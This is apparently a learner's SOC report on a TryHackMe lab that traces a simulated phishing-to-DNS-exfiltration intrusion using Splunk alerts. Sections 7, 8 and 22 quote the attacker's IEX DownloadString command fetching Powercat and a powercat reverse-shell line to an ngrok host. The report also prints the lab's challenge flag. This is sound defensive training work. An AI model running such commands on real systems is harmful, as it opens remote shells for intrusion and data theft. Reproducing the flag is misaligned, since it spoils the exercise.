# SOC INVESTIGATION REPORT

## TryHatMe — Phishing and Data Exfiltration Incident

---

## 1. Incident Overview

**Incident Type:** Phishing / Endpoint Compromise / Command & Control / Data Exfiltration

**Severity:** High

**Status:** Confirmed Security Incident

**Investigation Date:** 09/09/2026

**SIEM:** Splunk

**Primary Data Sources:** Sysmon, Email telemetry, DNS telemetry

**Affected Host:** `win-3450`

**Affected User:** Michael Ascot — CEO

**Primary Exfiltration Domain:** `haz4rdw4re.io`

**C2 / Remote Access Endpoint:** `2.tcp.ngrok.io:19282`

**Sensitive Resource Accessed:** `\\FILESRV-01\SSF-FinancialRecords`

---

# 2. Executive Summary

A security investigation was conducted following a series of phishing, process, execution, and network-related alerts within the TryHatMe environment.

A total of 36 alerts were investigated. The investigation identified one confirmed multi-stage compromise centered on workstation `win-3450`, assigned to Michael Ascot, CEO.

The attacker activity progressed through multiple stages, beginning with phishing activity and continuing into malicious PowerShell execution, remote access, network share access, data collection, local staging, and DNS-based data exfiltration.

The investigation identified malicious PowerShell execution using `-ExecutionPolicy Bypass`, followed by retrieval and execution of Powercat through PowerShell `DownloadString()` and `IEX`. Powercat was then used to establish a reverse PowerShell shell through an ngrok endpoint.

After gaining remote command execution, the attacker accessed the sensitive `SSF-FinancialRecords` network share by mapping it to drive `Z:`. Data from the share was copied into a local staging directory using `Robocopy.exe`.

The staged data was subsequently processed using PowerShell, converted to Base64, divided into chunks, and transmitted through repeated `nslookup.exe` queries to `haz4rdw4re.io`.

Ten High-severity alerts, `1025–1034`, were determined to represent individual observations of the same ongoing DNS exfiltration activity rather than ten separate incidents.

The encoded data was reconstructed and decoded during the investigation. The recovered data included references to:

- `ClientPortfolioSummary.xlsx`
- `InvestorPresentation2023.pptx`

The reconstructed data also contained the TryHackMe challenge flag:

`THM{1497321f4f6f059a52dfb124fb16566e}`

The available evidence confirms unauthorized access, command execution, data collection, staging, and exfiltration from the compromised endpoint.

---

# 3. Scope

The investigation covered:

- 36 SOC alerts.
- Email activity.
- Suspicious process creation.
- PowerShell execution.
- DNS activity.
- Network share access.
- File collection and staging.
- Command-and-control activity.
- DNS-based exfiltration.
- Correlation between alerts occurring on the same host.
- Assessment of potential impact.
- Recommended containment and remediation actions.

The investigation focused primarily on `win-3450` after multiple alerts were correlated to the same endpoint and user.

---

# 4. Affected Assets

## Primary Endpoint

**Hostname:** `win-3450`

**User:** Michael Ascot

**Role:** CEO

**Email:** `michael.ascot@tryhatme.com`

The host was identified as the primary compromised endpoint.

## Potentially Affected Resource

**Network Share:**

`\\FILESRV-01\SSF-FinancialRecords`

The share contained potentially sensitive financial records and was accessed from the compromised workstation.

## Local Staging Location

`C:\Users\michael.ascot\Downloads\exfiltration\`

## Suspicious Files

`C:\Users\michael.ascot\Downloads\PowerView.ps1`

`C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip`

---

# 5. Initial Detection

The investigation began with a queue containing 36 alerts of varying severity.

The initial triage strategy was to prioritize:

1. High-severity alerts.
2. Medium-severity alerts.
3. Low-severity alerts.

During the investigation, several apparently unrelated alerts were correlated based on:

- Host.
- User.
- Parent and child processes.
- Process IDs.
- Command lines.
- File paths.
- Timestamps.
- DNS queries.
- Network destinations.
- Shared indicators.

This correlation revealed that the most serious alerts were components of one larger attack chain.

---

# 6. Initial Phishing Activity

One of the significant email alerts was Alert `1005`.

The email targeted:

`michael.ascot@tryhatme.com`

Sender:

`john@hatmakereurope[.]xyz`

Subject:

`FINAL NOTICE: Overdue Payment - Account Suspension Imminent`

Attachment:

`ImportantInvoice-Febrary.zip`

The message used financial urgency and threatened account suspension in order to encourage the recipient to interact with the email.

The attachment was analyzed as clean:

- Size: 346 bytes
- Type: `application/x-zip-compressed`
- Executable: No
- Archive: Yes
- MD5: `332ffb18aa5c12126e4befd02388a6be`
- SHA-1: `ab600fbdd35d0e163582ad8d262b42cf8766ccf0`
- SHA-256: `145bb70abd0cc625f4a7add8cfb08982c39c4573470c8b87db41d755bd2f9ea0`

Despite the clean attachment analysis, the overall email was correctly classified as a True Positive phishing event after reviewing the complete context.

The sender, financial lure, urgency, deceptive subject, attachment, and high-value recipient all contributed to the assessment.

This event demonstrates that:

**A clean attachment does not make a phishing email benign.**

---

# 7. Malicious PowerShell Execution

The investigation identified malicious PowerShell activity associated with `win-3450`.

The observed execution included:

`powershell.exe -ExecutionPolicy Bypass`

The use of `-ExecutionPolicy Bypass` indicates an attempt to circumvent normal PowerShell execution restrictions.

Additional activity included:

`IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimirhino/powercat/master/powercat.ps1')`

This command:

1. Created a PowerShell web client.
2. Downloaded `powercat.ps1`.
3. Used `IEX` to execute the retrieved PowerShell code.

This provided the attacker with a mechanism for establishing remote command execution.

---

# 8. Command and Control

Powercat was executed with:

`powercat -c 2.tcp.ngrok.io -p 19282 -e powershell`

The command configured Powercat to:

- Connect to `2.tcp.ngrok.io`.
- Use port `19282`.
- Provide a PowerShell command shell.

This represents a reverse shell configuration.

The use of ngrok is not inherently malicious because ngrok is a legitimate tunneling service. However, in this investigation it was directly associated with the malicious Powercat reverse shell and therefore became a significant indicator of compromise.

DNS telemetry confirmed the endpoint resolving:

`2.tcp.ngrok.io`

to:

`3.22.53.161`

This activity correlated directly with the observed Powercat command.

---

# 9. Post-Exploitation Activity

Alert `1020` identified the creation of:

`C:\Users\michael.ascot\Downloads\PowerView.ps1`

PowerView is associated with PowerShell-based network and domain reconnaissance and post-exploitation activity.

The file was created on the same endpoint already confirmed to be compromised.

Because of this correlation, the alert was classified as a True Positive.

The presence of PowerView suggests that the attacker may have been performing additional reconnaissance or preparing for further post-exploitation activity.

The file should be preserved and analyzed for:

- Execution history.
- Network discovery.
- Domain discovery.
- User enumeration.
- Group enumeration.
- Credential-related activity.
- Lateral movement preparation.

---

# 10. Network Share Access

Alert `1022` identified:

`net.exe`

with:

`powershell.exe`

as the parent process.

The command was:

`"C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords`

This mapped the sensitive financial records share to drive `Z:`.

The activity was suspicious because it occurred under a PowerShell process associated with the confirmed compromise.

The resource accessed was:

`\\FILESRV-01\SSF-FinancialRecords`

This represented a significant escalation in the attack because the attacker moved from endpoint compromise toward access to potentially sensitive organizational data.

---

# 11. Data Collection and Staging

Alert `1023` identified:

`Robocopy.exe`

with:

`powershell.exe`

as the parent process.

The command was:

`"C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\downloads\exfiltration /E`

The working directory was:

`Z:\`

This is a critical finding.

The attacker had previously mapped:

`Z: → \\FILESRV-01\SSF-FinancialRecords`

Robocopy was then executed from `Z:` and recursively copied data into:

`C:\Users\michael.ascot\Downloads\exfiltration`

This provides evidence of:

**Sensitive Network Share → Local Collection → Local Staging**

The activity directly connects the sensitive file share to the later exfiltration operation.

---

# 12. Network Share Cleanup

Alert `1024` detected:

`net.exe use Z: /delete`

with:

`powershell.exe`

as the parent process.

Disconnecting a network drive is normally legitimate.

However, in this context it occurred after the attacker had:

1. Mapped the sensitive network share.
2. Accessed data from the share.
3. Copied data into a local staging directory.

The disconnect operation is therefore consistent with cleanup after data collection.

This alert was classified as a True Positive because of the surrounding attack context.

---

# 13. Data Preparation

The investigation identified:

`C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip`

The malicious PowerShell activity included logic equivalent to:

`[System.IO.File]::ReadAllBytes("C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip")`

The file contents were converted to Base64:

`[System.Convert]::ToBase64String(...)`

The resulting Base64 string was divided into approximately 30-character chunks.

Each chunk was then passed to:

`nslookup.exe`

and appended to:

`haz4rdw4re.io`

This establishes a deliberate data-exfiltration mechanism.

---

# 14. DNS Exfiltration

The investigation identified repeated process creation events in which:

`powershell.exe`

spawned:

`nslookup.exe`

The queries contained encoded data as subdomains of:

`haz4rdw4re.io`

The general pattern was:

`nslookup.exe <encoded-data>.haz4rdw4re.io`

This is consistent with DNS-based data exfiltration.

The use of DNS is significant because DNS traffic is commonly permitted through network boundaries, allowing attackers to abuse the protocol as an alternative data-transfer channel.

---

# 15. High-Severity Alert Correlation

Alerts `1025–1034` were all High severity.

Each alert contained a different encoded chunk.

The common characteristics were:

- Host: `win-3450`
- User: Michael Ascot
- Parent process: `powershell.exe`
- Child process: `nslookup.exe`
- Destination: `haz4rdw4re.io`
- Encoded subdomain data
- Similar timestamps
- Same overall process lineage

The alerts were therefore correlated into a single ongoing exfiltration operation.

This is an important SOC principle:

**Multiple alerts can represent one incident.**

Treating all ten alerts as independent incidents would have produced unnecessary investigation overhead and obscured the actual attack narrative.

---

# 16. Individual Contribution of DNS Alerts

Although the ten High alerts represented one operation, each alert provided additional evidence.

## Alert 1025

First identified chunk of the DNS exfiltration stream.

It established the relationship:

`PowerShell → nslookup → encoded data → haz4rdw4re.io`

## Alert 1026

Provided another encoded data chunk and demonstrated continued transmission.

## Alert 1027

Confirmed the same parent-child relationship and destination with another data chunk.

## Alert 1028

Further confirmed repeated DNS-based transfer from the compromised endpoint.

## Alert 1029

Provided another chunk of the staged dataset.

## Alert 1030

Continued the same encoded transfer pattern.

## Alert 1031

Provided additional encoded data and further corroborated the ongoing exfiltration.

## Alert 1032

Confirmed continued transfer using the same mechanism.

## Alert 1033

Contained a chunk beginning with:

`VEhNez`

which Base64-decodes to:

`THM{`

This provided strong evidence that the DNS queries contained actual challenge/data content rather than random DNS traffic.

## Alert 1034

Contained the final observed encoded chunk and completed the reconstruction of the transmitted data.

---

# 17. Data Reconstruction

The encoded data chunks from alerts `1025–1034` were reconstructed chronologically.

The combined data contained references to:

`ClientPortfolioSummary.xlsx`

and:

`InvestorPresentation2023.pptx`

The recovered data also contained the TryHackMe challenge flag:

`THM{1497321f4f6f059a52dfb124fb16566e}`

The ability to reconstruct meaningful data from the DNS queries provided strong confirmation that the observed traffic represented actual data exfiltration.

---

# 18. Attack Timeline

| Time | Event |
|---|---|
| `17:52:54.503` | Phishing email sent to Michael Ascot containing invoice-themed ZIP attachment |
| `18:12:51.503` | PowerShell resolves `raw.githubusercontent.com` |
| `18:12:52.503` | PowerShell resolves `2.tcp.ngrok.io` |
| `18:14:24.503` | `PowerView.ps1` created on `win-3450` |
| `18:16:19.503` | PowerShell maps Z: to `\\FILESRV-01\SSF-FinancialRecords` |
| `18:17:06.503` | Robocopy copies data from Z: to local `exfiltration` directory |
| `18:17:17.503` | Z: network drive disconnected |
| `18:17:51.503` | Malicious PowerShell activity identified, including Base64/DNS exfiltration logic |
| `18:18:04.503` | DNS exfiltration chunks begin appearing through `nslookup.exe` |
| `18:18:20.503` | Additional DNS exfiltration chunks transmitted |
| Investigation phase | Encoded chunks reconstructed |
| Investigation phase | Exfiltrated data identified |
| Investigation phase | THM flag recovered |

---

# 19. Attack Chain

The complete observed attack chain was:

**Phishing Email**

↓

**Michael Ascot / `win-3450`**

↓

**PowerShell with `-ExecutionPolicy Bypass`**

↓

**PowerShell `DownloadString()`**

↓

**Powercat**

↓

**Reverse PowerShell Shell**

↓

**ngrok C2**

↓

**Network Share Access**

`\\FILESRV-01\SSF-FinancialRecords`

↓

**Robocopy Collection**

↓

**Local Data Staging**

`C:\Users\michael.ascot\Downloads\exfiltration`

↓

**Archive**

`exfilt8me.zip`

↓

**Base64 Encoding**

↓

**Data Chunking**

↓

**nslookup.exe**

↓

**DNS Exfiltration**

`haz4rdw4re.io`

↓

**Reconstructed Data**

↓

**THM Flag**

---

# 20. Attacker Intent

The observed activity indicates a deliberate multi-stage attack rather than isolated suspicious behavior.

The likely attacker objectives were:

## Gain Access

Use phishing and social engineering to target a high-value employee.

## Establish Execution

Use PowerShell and bypass execution restrictions.

## Establish Remote Control

Download and execute Powercat and establish a reverse shell through ngrok.

## Perform Post-Exploitation

Use PowerView for potential reconnaissance and discovery.

## Access Sensitive Data

Map the `SSF-FinancialRecords` network share.

## Collect Data

Copy information from the network share using Robocopy.

## Stage Data

Store the collected information locally and package it into `exfilt8me.zip`.

## Exfiltrate Data

Encode the collected information and transmit it through DNS queries.

The attacker's apparent objective was therefore **unauthorized collection and external exfiltration of organizational data**.

---

# 21. MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| PowerShell | T1059.001 | Malicious PowerShell execution |
| Ingress Tool Transfer | T1105 | `DownloadString()` used to retrieve Powercat |
| Remote Access Software | T1219 | ngrok used in the reverse-shell chain |
| Data from Network Shared Drive | T1039 | Data collected from `SSF-FinancialRecords` |
| Data Staged | T1074.001 | Data staged in local `exfiltration` directory |
| Archive Collected Data | T1560 | `exfilt8me.zip` |
| Data Encoding | T1132.001 | Base64 encoding |
| Exfiltration Over Alternative Protocol | T1048.003 | DNS used for exfiltration |
| Application Layer Protocol: DNS | T1071.004 | DNS queries used as the exfiltration channel |

These mappings are based on observed behavior during the investigation.

---

# 22. Indicators of Compromise

## Host

`win-3450`

## User

`Michael Ascot`

`michael.ascot@tryhatme.com`

## Files

`C:\Users\michael.ascot\Downloads\PowerView.ps1`

`C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip`

## Network Share

`\\FILESRV-01\SSF-FinancialRecords`

## Domains

`haz4rdw4re.io`

`2.tcp.ngrok.io`

`raw.githubusercontent.com`

`raw.githubusercontent.com` is a legitimate service but was used in this incident to retrieve Powercat.

## C2

`2.tcp.ngrok.io:19282`

## Processes

`powershell.exe`

`powercat`

`Robocopy.exe`

`nslookup.exe`

## Commands / Behaviors

`powershell.exe -ExecutionPolicy Bypass`

`DownloadString()`

`IEX`

`powercat -c 2.tcp.ngrok.io -p 19282 -e powershell`

`net.exe use Z: \\FILESRV-01\SSF-FinancialRecords`

`Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E`

`net.exe use Z: /delete`

Base64 encoding

Repeated DNS queries containing encoded data

---

# 23. Impact Assessment

The investigation identified evidence of unauthorized access to:

`\\FILESRV-01\SSF-FinancialRecords`

Data from the share was copied to the compromised endpoint and subsequently staged for exfiltration.

The reconstructed data contained references to business documents including:

`ClientPortfolioSummary.xlsx`

`InvestorPresentation2023.pptx`

The incident therefore represents a potential confidentiality breach.

Potential impact includes:

- Unauthorized access to financial records.
- Unauthorized collection of company data.
- Exposure of internal business documents.
- Compromise of the CEO workstation.
- Unauthorized remote access.
- Potential credential compromise.
- Potential reconnaissance activity.
- Potential additional post-exploitation.
- Potential lateral movement.

The exact scope of the breach cannot be determined from the available telemetry alone and would require additional forensic investigation.

---

# 24. Immediate Containment Recommendations

## Endpoint

Immediately isolate:

`win-3450`

Terminate unauthorized:

- PowerShell processes.
- Powercat/reverse-shell processes.
- Other attacker-controlled processes.

Preserve forensic evidence before destructive remediation where possible.

## Network

Block:

`haz4rdw4re.io`

Investigate and restrict the identified ngrok endpoint:

`2.tcp.ngrok.io:19282`

Search for additional communication involving the same infrastructure.

## Credentials

Reset credentials associated with:

`Michael Ascot`

Review authentication logs for suspicious activity.

## File Server

Investigate:

`\\FILESRV-01\SSF-FinancialRecords`

Determine:

- Which files were accessed.
- Which files were copied.
- When the access occurred.
- Whether additional users accessed the share.
- Whether other endpoints accessed the share.

---

# 25. Endpoint Forensic Recommendations

Perform a full forensic investigation of `win-3450`.

Review:

- PowerShell history.
- PowerShell operational logs.
- Process creation logs.
- Network connections.
- DNS queries.
- Scheduled tasks.
- Services.
- Registry persistence.
- Startup locations.
- User profile activity.
- Downloads directory.
- Temporary files.
- Archive files.
- Additional PowerShell scripts.
- Credential access activity.
- Network discovery.
- Lateral movement.

Specifically investigate:

`PowerView.ps1`

and:

`exfilt8me.zip`

for additional evidence of attacker activity.

---

# 26. DNS Investigation Recommendations

Search DNS telemetry for:

`haz4rdw4re.io`

Investigate:

- Historical queries.
- Query frequency.
- Number of unique subdomains.
- High-entropy subdomains.
- Base64-like strings.
- Other hosts querying the domain.
- Additional DNS tunneling activity.
- Other suspicious external domains.

The detection environment should consider alerting when:

- `nslookup.exe` is spawned by PowerShell.
- PowerShell generates large numbers of DNS requests.
- DNS subdomains contain Base64-like data.
- A host generates many unique subdomains under the same uncommon domain.
- DNS activity follows suspicious PowerShell execution.

---

# 27. Detection Engineering Recommendations

## Email Detection

The existing external-sender rule generated significant noise.

Detection should not rely solely on:

**External sender + unusual TLD**

Additional context should include:

- Sender reputation.
- Domain reputation.
- Domain age.
- URL reputation.
- Attachment analysis.
- Brand impersonation.
- Financial lures.
- Credential requests.
- Urgency.
- User interaction.
- Endpoint activity following delivery.

## PowerShell Detection

High-value detection opportunities include:

- `-ExecutionPolicy Bypass`
- `DownloadString`
- `IEX`
- Powercat strings.
- Base64 encoding/decoding.
- PowerShell network connections.
- PowerShell spawning `nslookup.exe`.
- PowerShell spawning `net.exe`.
- PowerShell spawning `Robocopy.exe`.

## DNS Exfiltration Detection

Detection opportunities include:

- Repeated DNS queries to uncommon domains.
- Base64-like subdomains.
- Long or high-entropy subdomains.
- High-frequency unique queries.
- DNS requests generated by unusual processes.
- `nslookup.exe` spawned by PowerShell.
- DNS activity following suspicious file staging.

## Process Detection

The parent-child process detection rule should account for legitimate Windows behavior.

Examples observed during the investigation:

`services.exe → TrustedInstaller.exe`

`services.exe → WUDFHost.exe`

`services.exe → svchost.exe`

`svchost.exe → taskhostw.exe`

`svchost.exe → rdpclip.exe`

Allowlisting known legitimate combinations would reduce alert fatigue while maintaining detection of genuinely anomalous process relationships.

---

# 28. False Positive Findings

The investigation identified multiple legitimate Windows process executions.

Examples included:

- `TrustedInstaller.exe`
- `taskhostw.exe`
- `rdpclip.exe`
- `WUDFHost.exe`
- `svchost.exe`

These were considered benign because they demonstrated expected:

- Parent processes.
- System paths.
- Command-line parameters.
- Windows functionality.
- Lack of correlated malicious activity.

Several external email alerts were also classified as False Positives for the specific detection rule because the rule was overly broad.

However, the investigation highlighted an important distinction:

**A suspicious email can exist without the specific detection alert being actionable as a compromise.**

The classification should therefore be based on the entire available evidence rather than a single characteristic such as an external TLD.

---

# 29. Lessons Learned

## 29.1 Context Is Critical

Individual commands and processes can be legitimate.

For example:

`net use Z: /delete`

is normally benign.

In this incident, however, it occurred after sensitive data had been copied from the mapped network share.

Context changed the significance of the event.

## 29.2 Clean Files Do Not Equal Benign Events

Alert `1005` demonstrated that a clean attachment does not automatically make the associated email benign.

The sender, recipient, subject, content, attachment, user role, and subsequent behavior must all be considered.

## 29.3 Correlation Reduces MTTR

The ten High DNS alerts were correctly recognized as one continuous activity.

Grouping correlated alerts prevents analysts from wasting time treating each event as a separate incident.

## 29.4 Explain Attacker Intent

A strong SOC investigation should answer not only:

**What happened?**

but also:

**Why did the attacker do it?**

In this case:

- PowerShell enabled execution.
- Powercat/ngrok provided remote access.
- Network share access provided sensitive data.
- Robocopy performed collection/staging.
- Base64 encoded the collected information.
- DNS provided an exfiltration channel.

## 29.5 Explain Each Alert's Contribution

Even when multiple alerts belong to the same incident, each alert should explain what new evidence it contributes.

This is particularly important when reporting repeated DNS exfiltration alerts.

## 29.6 Include People and Roles

Reports should identify:

- User.
- Role.
- Host.
- Source.
- Destination.
- Potentially affected systems.

This provides operational context for other analysts and incident responders.

---

# 30. Analyst Assessment

The investigation established a high-confidence compromise of `win-3450`.

The evidence demonstrates:

**Phishing**

→ **Malicious PowerShell**

→ **Remote Access**

→ **Sensitive Network Share Access**

→ **Data Collection**

→ **Local Staging**

→ **Data Encoding**

→ **DNS Exfiltration**

The strongest evidence was the correlation between:

- Malicious PowerShell.
- Powercat.
- ngrok.
- `SSF-FinancialRecords`.
- Robocopy.
- `exfilt8me.zip`.
- Base64 encoding.
- Repeated `nslookup.exe` activity.
- `haz4rdw4re.io`.
- Reconstructed exfiltrated data.

The DNS activity was therefore not an isolated anomaly but the final stage of a larger, coordinated attack.

---

# 31. Incident Severity Assessment

**Overall Severity:** High

### Severity Rationale

The incident involved:

- Confirmed endpoint compromise.
- Remote command execution.
- Access to sensitive financial records.
- Data collection.
- Data staging.
- Confirmed data exfiltration.
- Potential credential compromise.
- Potential post-exploitation reconnaissance.

The presence of confirmed data exfiltration significantly increases the severity of the incident.

---

# 32. Recommended Incident Response Priority

### Priority 1 — Containment

- Isolate `win-3450`.
- Stop active attacker processes.
- Block known exfiltration infrastructure.

### Priority 2 — Evidence Preservation

- Preserve endpoint evidence.
- Preserve PowerShell logs.
- Preserve DNS logs.
- Preserve file server logs.
- Preserve suspicious files.

### Priority 3 — Credential Security

- Reset Michael Ascot's credentials.
- Review authentication activity.
- Investigate potential credential exposure.

### Priority 4 — Scope Investigation

- Investigate the file server.
- Identify accessed/copied files.
- Hunt for additional compromised hosts.
- Search for additional PowerShell activity.
- Search for additional DNS tunneling.

### Priority 5 — Recovery

- Remove attacker persistence.
- Rebuild or reimage the endpoint if required.
- Restore trusted configurations.
- Validate endpoint integrity.
- Continue monitoring for recurrence.

---

# 33. Final Incident Conclusion

The investigation confirms that TryHatMe experienced a multi-stage security incident centered on `win-3450`.

The attacker progressed from phishing and malicious PowerShell execution to remote access, sensitive data collection, staging, and DNS-based exfiltration.

The most significant finding was the use of repeated `nslookup.exe` requests containing Base64-encoded data as subdomains of `haz4rdw4re.io`.

The reconstruction of these DNS chunks produced recognizable business-document data and the TryHackMe flag:

`THM{1497321f4f6f059a52dfb124fb16566e}`

This provides strong evidence that the attacker was actively transferring collected data outside the environment.

The incident should therefore be treated as a **confirmed high-severity compromise and potential data breach**.

Immediate endpoint isolation, evidence preservation, credential reset, file-server investigation, DNS investigation, and broader threat hunting are recommended.

---

# 34. Final Case Summary

| Field | Finding |
|---|---|
| Incident | Phishing and Data Exfiltration |
| Severity | High |
| Primary Host | `win-3450` |
| Primary User | Michael Ascot |
| User Role | CEO |
| SIEM | Splunk |
| Alerts Investigated | 36 |
| Confirmed True Positives | 15 |
| False Positives | 21 |
| Initial Access | Phishing |
| Execution | PowerShell |
| C2 | Powercat / ngrok |
| Sensitive Resource | `\\FILESRV-01\SSF-FinancialRecords` |
| Collection | Robocopy |
| Staging | `C:\Users\michael.ascot\Downloads\exfiltration\` |
| Archive | `exfilt8me.zip` |
| Encoding | Base64 |
| Exfiltration | DNS |
| Exfiltration Domain | `haz4rdw4re.io` |
| C2 Endpoint | `2.tcp.ngrok.io:19282` |
| Additional Tool | `PowerView.ps1` |
| Recovered Data | `ClientPortfolioSummary.xlsx`, `InvestorPresentation2023.pptx` |
| Confirmed Exfiltration | Yes |
| THM Flag | `THM{1497321f4f6f059a52dfb124fb16566e}` |
| Final Assessment | Confirmed High-Severity Compromise |

---

# 35. Analyst Learning Outcome

This investigation reinforced the importance of moving beyond isolated alert classification and toward complete incident reconstruction.

The investigation successfully demonstrated:

- Alert prioritization.
- SIEM-based investigation.
- Process analysis.
- Parent-child correlation.
- PowerShell analysis.
- DNS investigation.
- IOC identification.
- Data-exfiltration detection.
- Alert clustering.
- Attack-chain reconstruction.
- Incident severity assessment.
- Evidence-based remediation planning.

The main areas identified for continued improvement are:

- More explicitly documenting attacker intent.
- Consistently identifying involved users, roles, systems, and environments.
- Explaining the unique contribution of individual alerts.
- Including broader impact context in False Positive reports.
- Avoiding over-reliance on individual artifacts when determining whether activity is malicious.

The investigation resulted in **one incorrect classification out of 36 alerts**, which provided a valuable lesson regarding the distinction between a clean artifact and a benign security event.

The key principle going forward is:

**Do not only ask whether an artifact is malicious. Determine what the complete activity tells us about the attacker, their intent, their objectives, and the impact on the environment.**

---

# End of Report
